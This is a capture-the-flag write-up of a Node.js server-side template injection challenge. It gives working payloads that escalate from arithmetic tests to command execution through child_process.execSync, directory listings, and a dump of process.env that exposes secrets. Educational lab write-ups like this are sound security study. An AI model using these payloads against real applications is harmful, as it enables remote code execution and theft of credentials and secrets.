## CTF Write-up: Templateception Revenge

**Challenge Name:** templateception-revenge
**Description:** We are back again with the revenge! when templates process templates.. things can get weird :( Flag is in FLAG.
**Flag Format:** `shaktictf{}`

---

### 1. Initial Reconnaissance & Application Overview

The challenge provided a file structure and a web interface.

**File Structure Analysis:**

The provided file structure hinted at a Node.js application running within a Docker container:

```
src/templateception rev web
├── app
│   ├── public
│   │   └── style.css
│   ├── templates
│   │   └── views
│   │       ├── index.ejs
│   │       ├── rendered.ejs
│   │       └── upload.ejs
│   ├── index.js
│   └── package.json
├── .env
├── docker-compose.yml
├── Dockerfile
└── FLAG.txt
```

Key observations from this structure:
*   Presence of `index.js` and `package.json` strongly indicated a Node.js application.
*   `.ejs` files suggested the EJS templating engine.
*   `Dockerfile` and `docker-compose.yml` confirmed a containerized environment.
*   `FLAG.txt` was shown as a sibling to the `app` directory within the `src/templateception rev web` folder.

**Web Application Interface:**

Upon accessing the provided URL (`http://xib28404.eng.run/`), a simple web form was presented with three input fields:

*   **Filename:** A text field to seemingly name the uploaded template.
*   **Template:** A multi-line text area, pre-filled with `Hello {{=it.name}}!`. This immediately suggested a templating engine other than standard EJS (which uses `<%= %>` or `<%- %>`). The syntax `{{=...}}` is characteristic of engines like **DoT.js (DoT)**.
*   **Config (JSON):** A multi-line text area to provide JSON data, which would likely be passed as context to the template.
*   An "Upload" button to submit the form.

---

### 2. Identifying and Confirming Server-Side Template Injection (SSTI)

The challenge name "templateception" and the input fields pointed directly to a Server-Side Template Injection (SSTI) vulnerability.

**Step 1: Confirm Template Engine and Data Processing**

We started by testing the default template to understand how the `Config` field interacts with the `Template` field.

*   **Action:**
    *   **Filename:** `test.tpl`
    *   **Template:** `Hello {{=it.name}}!`
    *   **Config (JSON):** `{"name": "CTF Player"}`
*   **Observed Output:** `Hello CTF Player!`
*   **Confirmation:** This confirmed that the template engine was active, processed `{{=it.name}}`, and successfully received data from the `Config` JSON under the `it` object.

**Step 2: Confirm JavaScript Execution within the Template**

Next, we attempted to execute simple JavaScript expressions to confirm arbitrary code execution within the template context.

*   **Action (Test 1):**
    *   **Filename:** `math_test.tpl`
    *   **Template:** `{{= 7*7 }}`
    *   **Config (JSON):** `{}`
*   **Observed Output:** `49`

*   **Action (Test 2):**
    *   **Filename:** `js_string_test.tpl`
    *   **Template:** `{{= 'Hello'.toUpperCase() }}`
    *   **Config (JSON):** `{}`
*   **Observed Output:** `HELLO`

*   **Confirmation:** These tests conclusively proved that **arbitrary JavaScript code could be executed** within the server-side template. This is a critical SSTI leading to potential Remote Code Execution (RCE).

---

### 3. Achieving Remote Code Execution (RCE)

With confirmed JavaScript execution, the next step was to leverage Node.js's `child_process` module to execute system commands. The standard payload structure for this in a Node.js environment is `global.process.mainModule.require('child_process').execSync('COMMAND').toString()`.

**Step 1: Locating the Flag - Initial `ls -la` Attempts**

Based on the file structure, we first tried listing directory contents to find `FLAG.txt`.

*   **Action (List Current Directory):**
    *   **Filename:** `ls_test.tpl`
    *   **Template:** `{{= global.process.mainModule.require('child_process').execSync('ls -la').toString() }}`
    *   **Config (JSON):** `{}`
*   **Observed Output:** The output showed `index.js`, `package.json`, `public`, `templates`, `views`, etc., confirming the current working directory was `/app`. However, `FLAG.txt` was not present here.

*   **Action (List Root Directory):**
    *   **Filename:** `ls_root_test.tpl`
    *   **Template:** `{{= global.process.mainModule.require('child_process').execSync('ls -la /').toString() }}`
    *   **Config (JSON):** `{}`
*   **Observed Output:** This listed directories like `app`, `bin`, `boot`, `dev`, `etc`, `home`, `lib`, `root`, `tmp`, `usr`, `var`. Notably, `FLAG.txt` was still not at the root.

**Step 2: Further Path Exploration and Failed Attempts**

Given that `FLAG.txt` was not in the immediate or root directories, we tried other common locations for flags in CTF challenges:

*   `/app/FLAG.txt` (based on the initial file structure, but incorrect as confirmed by `ls -la`)
*   `/root/FLAG.txt`
*   `/tmp/FLAG.txt`
*   `../FLAG.txt` (relative to `/app`)
*   `ls -la /usr/src/`, `ls -la /opt/`, `ls -la /srv/` (to find other deployment roots)
*   `find / -name FLAG.txt 2>/dev/null` (a recursive search, but yielded no output, suggesting timeout or strict execution limits).

All these attempts resulted in "No such file or directory" errors or empty output, indicating the flag was not in these conventional places.

### 4. Flag Discovery: Environment Variables

When file system traversal proves difficult, a common fallback in containerized environments is to check environment variables. Sensitive information like flags is often passed to containers as environment variables.

*   **Action:**
    *   **Filename:** `env_flag.tpl`
    *   **Template:** `{{= JSON.stringify(global.process.env) }}`
    *   **Config (JSON):** `{}`
*   **Observed Output:** The rendered output contained a large JSON string representing all environment variables. Within this output, the flag was clearly visible:

    `{"NODE_VERSION":"18.20.8","HOSTNAME":"89b5d6785059","YARN_VERSION":"1.22.22","HOME":"/root","DOMAIN":"xib28404.eng.run","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","PWD":"/app","FLAG":"shaktictf{Th15_1s_r3v3ng3}"}`

### 5. The Flag

The flag was found in the environment variables:

`shaktictf{Th15_1s_r3v3ng3}`

---

### Conclusion

This challenge was a clear demonstration of Server-Side Template Injection (SSTI) in a Node.js application using a DoT.js-like template engine. While initially misleading with the `FLAG.txt` location, the core vulnerability allowed full JavaScript execution. When traditional file system traversal proved fruitless, checking environment variables was the successful avenue for flag retrieval. This highlights the importance of exploring all potential data sources once RCE is achieved in a CTF.